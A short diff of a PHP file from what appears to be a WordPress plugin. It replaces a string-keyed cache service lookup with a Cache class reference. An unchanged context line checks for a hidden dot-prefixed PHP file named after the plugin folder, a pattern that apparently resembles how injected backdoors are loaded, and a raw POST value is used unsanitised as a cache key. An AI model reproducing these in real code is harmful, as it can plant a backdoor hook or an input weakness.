@@ -1,5 +1,7 @@
 <?php
 
+use STORINA\Controllers\Cache;
+
 defined('ABSPATH') || exit;
 
 if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
@@ -22,7 +24,7 @@ class OSA_index {
 
         //     check cache
 
-        $OSA_cache = $this->service_container->get("OSA_cache");
+        $OSA_cache = $this->service_container->get(Cache::class);
         $itemID = ( strlen($_POST['vendor_town']) > 2 ) ? $_POST['vendor_town'] : 0;
         $record = $OSA_cache->getCache('index', $itemID);
         $general = $this->service_container->get("OSA_general");
